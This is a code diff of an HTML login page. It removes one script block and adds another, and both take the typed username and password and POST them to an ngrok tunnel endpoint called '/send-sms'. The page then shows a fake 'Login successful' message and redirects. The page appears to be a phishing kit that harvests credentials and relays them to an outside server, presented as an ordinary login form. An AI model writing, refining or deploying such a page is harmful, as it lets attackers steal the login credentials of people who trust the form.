@@ -69,45 +69,6 @@
             display: none;
         }
     </style>
-    <script>
-        document.addEventListener("DOMContentLoaded", function() {
-            document.getElementById("login-form").addEventListener("submit", function(event) {
-                event.preventDefault(); // Prevent default form submission
-                handleLogin();
-            });
-        });
-
-        async function handleLogin() {
-            const username = document.getElementById("username").value;
-            const password = document.getElementById("password").value;
-            const errorMsg = document.getElementById("error-msg");
-
-            // Replace 'http://localhost:3000' with your Ngrok public URL
-            const SERVER_URL = "https://c91d-212-5-142-68.ngrok-free.app/send-sms";
-
-            try {
-                const response = await fetch(SERVER_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ username, password })
-                });
-
-                if (!response.ok) {
-                    throw new Error("Server error: " + response.status);
-                }
-
-                const data = await response.text();
-                console.log("Server response:", data);
-
-                // Redirect only if response is successful
-                window.location.href = "index.html";
-            } catch (error) {
-                console.error("Error:", error);
-                errorMsg.textContent = "Failed to log in. Please try again.";
-                errorMsg.style.display = "block";
-            }
-        }
-    </script>
 </head>
 <body>
 
@@ -129,6 +90,44 @@
         <p>Forgot your password? <a href="#">Reset it here</a></p>
     </div>
 </div>
+
+<script>
+    document.addEventListener("DOMContentLoaded", function() {
+        document.getElementById("login-form").addEventListener("submit", async function(event) {
+            event.preventDefault(); // Prevent default form submission
+            
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+            const errorMsg = document.getElementById("error-msg");
+
+            const SERVER_URL = " https://943e-212-5-142-68.ngrok-free.app/send-sms"; // Replace with your actual Ngrok URL
+            
+            try {
+                const response = await fetch(SERVER_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username, password })
+                });
+
+                const text = await response.text(); // Get response as text
+                
+                if (!response.ok) {
+                    throw new Error(`Server Error (${response.status}): ${text}`);
+                }
+
+                console.log("Server response:", text);
+
+                alert("Login successful! Redirecting...");
+                window.location.href = "index.html"; // Redirect on success
+
+            } catch (error) {
+                console.error("Error:", error);
+                errorMsg.textContent = "Login failed. Please try again.";
+                errorMsg.style.display = "block";
+            }
+        });
+    });
+</script>
 
 </body>
 </html>
